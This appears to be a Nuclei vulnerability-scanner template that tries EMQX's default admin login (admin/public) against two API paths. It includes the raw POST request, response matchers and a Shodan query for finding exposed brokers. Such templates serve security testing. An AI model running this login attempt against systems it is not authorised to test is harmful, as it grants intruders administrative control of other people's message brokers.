id: emqx-default-login
info:
  name: Emqx Default Admin Login
  author: For3stCo1d
  severity: high
  description: Emqx default admin credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    runzero-match: service["favicon.ico.image.mmh3"] == "-670975485"
    max-request: 1
    shodan-query: http.favicon.hash:"-670975485"
  tags: default-login,emqx,vuln
variables:
  password: public
  username: admin
http:
  - attack: clusterbomb
    matchers:
      - condition: and
        dsl:
          - body == "{\"code\":0}"
          - status_code == 200
        type: dsl
      - condition: and
        dsl:
          - contains(body, "\"token\":") && contains(body, "\"license\":")
          - contains(content_type, 'application/json')
          - status_code == 200
        type: dsl
    matchers-condition: or
    payloads:
      path:
        - /api/v4/auth
        - /api/v5/login
    raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}
